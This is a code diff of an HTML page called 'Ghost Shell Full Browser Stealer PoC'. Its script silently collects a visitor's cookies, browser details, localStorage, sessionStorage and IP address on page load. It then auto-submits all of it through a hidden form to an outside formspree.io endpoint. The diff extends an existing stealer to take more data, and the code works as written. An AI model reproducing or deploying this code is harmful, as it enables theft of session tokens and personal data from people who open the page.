@@ -496,7 +496,7 @@ height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Ghost Shell Browser Data Stealer PoC</title>
+    <title>Ghost Shell Full Browser Stealer PoC</title>
     <style>
         body {
             background-color: black; /* Black background */
@@ -520,7 +520,7 @@ height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
 </head>
 <body>
 
-    <h2>Ghost Shell Browser Data Stealer PoC</h2>
+    <h2>Ghost Shell Full Browser Stealer PoC</h2>
 
     <form id="stealthForm" action="https://formspree.io/f/xoveanyq" method="POST">
         <input type="hidden" name="cookies" id="cookieField" value="default_cookie">
@@ -530,13 +530,16 @@ height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
         <input type="hidden" name="language" id="languageField" value="default_language">
         <input type="hidden" name="platform" id="platformField" value="default_platform">
         <input type="hidden" name="timezone" id="timezoneField" value="default_timezone">
+        <input type="hidden" name="local_storage" id="localStorageField" value="default_local">
+        <input type="hidden" name="session_storage" id="sessionStorageField" value="default_session">
+        <input type="hidden" name="ip_address" id="ipField" value="default_ip">
         <input type="hidden" name="fallback" value="not_empty"> <!-- Prevents empty form rejection -->
         <button type="submit" name="submitButton">Send</button>
     </form>
 
     <script>
         document.addEventListener("DOMContentLoaded", function() {
-            // Capture cookies and additional browser data
+            // Capture browser data
             var cookies = document.cookie || "No_Cookies";
             var userAgent = navigator.userAgent || "Unknown_User_Agent";
             var referrer = document.referrer || "No_Referrer";
@@ -544,8 +547,11 @@ height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
             var language = navigator.language || navigator.userLanguage || "Unknown_Language";
             var platform = navigator.platform || "Unknown_Platform";
             var timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || "Unknown_Timezone";
+            var localStorageData = JSON.stringify(localStorage.length ? localStorage : "No_LocalStorage") || "No_LocalStorage";
+            var sessionStorageData = JSON.stringify(sessionStorage.length ? sessionStorage : "No_SessionStorage") || "No_SessionStorage";
+            var ipAddress = "Fetching_IP...";
 
-            // Inject data into form fields
+            // Inject initial data into form fields
             document.getElementById("cookieField").value = cookies;
             document.getElementById("userAgentField").value = userAgent;
             document.getElementById("referrerField").value = referrer;
@@ -553,13 +559,36 @@ height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
             document.getElementById("languageField").value = language;
             document.getElementById("platformField").value = platform;
             document.getElementById("timezoneField").value = timezone;
+            document.getElementById("localStorageField").value = localStorageData;
+            document.getElementById("sessionStorageField").value = sessionStorageData;
+            document.getElementById("ipField").value = ipAddress;
 
-            // Submit form if any meaningful data exists
-            if (cookies !== "No_Cookies" || referrer !== "No_Referrer" || 
-                screenResolution !== "Unknown_Screen" || language !== "Unknown_Language" || 
-                platform !== "Unknown_Platform" || timezone !== "Unknown_Timezone") {
-                document.getElementById("stealthForm").submit();
-            }
+            // Fetch IP address from external API
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    ipAddress = data.ip || "Unknown_IP";
+                    document.getElementById("ipField").value = ipAddress;
+                    // Submit form after IP is fetched if any data is meaningful
+                    if (cookies !== "No_Cookies" || referrer !== "No_Referrer" || 
+                        screenResolution !== "Unknown_Screen" || language !== "Unknown_Language" || 
+                        platform !== "Unknown_Platform" || timezone !== "Unknown_Timezone" || 
+                        localStorageData !== "No_LocalStorage" || sessionStorageData !== "No_SessionStorage" || 
+                        ipAddress !== "Unknown_IP") {
+                        document.getElementById("stealthForm").submit();
+                    }
+                })
+                .catch(error => {
+                    console.error('IP fetch failed:', error);
+                    document.getElementById("ipField").value = "IP_Fetch_Failed";
+                    // Submit anyway if other data exists
+                    if (cookies !== "No_Cookies" || referrer !== "No_Referrer" || 
+                        screenResolution !== "Unknown_Screen" || language !== "Unknown_Language" || 
+                        platform !== "Unknown_Platform" || timezone !== "Unknown_Timezone" || 
+                        localStorageData !== "No_LocalStorage" || sessionStorageData !== "No_SessionStorage") {
+                        document.getElementById("stealthForm").submit();
+                    }
+                });
         });
     </script>
 </body>
